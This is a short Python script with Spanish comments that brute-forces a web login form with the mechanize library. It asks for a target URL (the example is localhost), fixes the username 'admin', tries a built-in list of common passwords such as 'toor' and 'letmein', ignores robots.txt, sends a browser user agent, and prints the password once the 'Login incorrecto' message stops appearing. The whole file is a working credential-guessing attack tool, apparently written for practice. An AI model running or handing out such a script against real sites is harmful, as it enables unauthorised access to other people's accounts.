# En este codigo se muestra un software para hace fuerza bruta a un login
# Primero importamos las libreria mechanize
# pip install mechanize


import mechanize
import time

# Se crean las variables necesarias
url_victima = input("Por favor, la direccion url de la pagina web (ej: http://localhost:8080/login) : ")
# url_victima = "http://localhost:8080/login"
usuarios = "admin"
contrasena = ["1234", "admin", "toor", "letmein", "root", "password"]


# Crear navegador
br = mechanize.Browser()
br.set_handle_robots(False)  # Ignorar robots.txt
br.set_handle_refresh(False)
br.addheaders = [('User-agent', 'Mozilla/5.0')]

# Probar cada contraseña
for pwd in contrasena:
    try:
        br.open(url_victima)
        br.select_form(nr=0)  # Selecciona el primer formulario de la página

        # Completar campos del formulario
        br["usuarios"] = usuarios
        br["password"] = pwd

        response = br.submit()
        content = response.read().decode()

        # Verificar si el login fue exitoso
        if "Login incorrecto" not in content:
            print(f"Contraseña encontrada: {pwd}")
            break
        else:
            print(f"Falló: {pwd}")
        
        time.sleep(1)  # Evita hacer muchas peticiones seguidas

    except Exception as e:
        print(f"Error con {pwd}: {e}")